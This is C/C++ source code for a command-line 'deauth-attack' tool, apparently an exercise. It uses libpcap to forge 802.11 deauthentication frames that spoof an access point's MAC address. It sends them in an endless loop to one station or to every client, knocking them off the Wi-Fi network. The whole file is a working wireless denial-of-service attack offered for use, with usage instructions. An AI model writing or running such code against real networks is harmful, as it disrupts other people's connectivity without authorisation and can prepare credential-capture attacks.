#include <pcap.h>
#include <stdio.h>
#include <stdbool.h>
#include <iostream>
#include <iomanip>
#include <cstring>
#include <map>
#include <unistd.h>
#include "mac.h"
#include "radiotap.h"
#include "beaconframe.h"

void usage(){
    std::cout << "syntax : deauth-attack <interface> <ap mac> [<station mac>]" << std::endl;
    std::cout << "sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB" << std::endl;
}

struct SSID
{
    uint8_t num;
    uint8_t len;
};

int main(int argc, char *argv[])
{
    bool sflg = false;
    if(argc != 3 && argc != 4){
        usage();
        exit(0);
    }
    
    const char* interface =argv[1];
    Mac APmac = Mac(argv[2]);
    Mac Stationmac;
    if(argc==4)
        Stationmac = Mac(argv[3]);
    else
        Stationmac = Mac("FF:FF:FF:FF:FF:FF");

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
    if(handle == NULL){
        fprintf(stderr,"couldn't open device %s: %s\n", interface, errbuf);
        return -1;
    }

    Deauth deauth;
    
    deauth.radiotap_.version_ = 0;
    deauth.radiotap_.pad_ = 0;
    deauth.radiotap_.len_ = 0xc;
    deauth.radiotap_.present_flags_ = 0x00008004;

    deauth.pad_ = 0x00180002;

    deauth.beacon_.fc_ = 0x00c0;
    deauth.beacon_.duration_ = 0x013a;
    deauth.beacon_.dmac_ = Stationmac;
    deauth.beacon_.smac_ = APmac;
    deauth.beacon_.bssid_ = APmac;
    deauth.beacon_.sq_ = 0x0000;

    deauth.manage_ = 0x0007;

    while(true){
		int res =  pcap_sendpacket(handle, reinterpret_cast<const u_char *>(&deauth), sizeof(Deauth));
		if (res != 0) {
			printf("pcap_sendpacket return %d(%s)\n", res, pcap_geterr(handle));
            break;
		}
        sleep(1);
    }

    pcap_close(handle);
    return 0;
}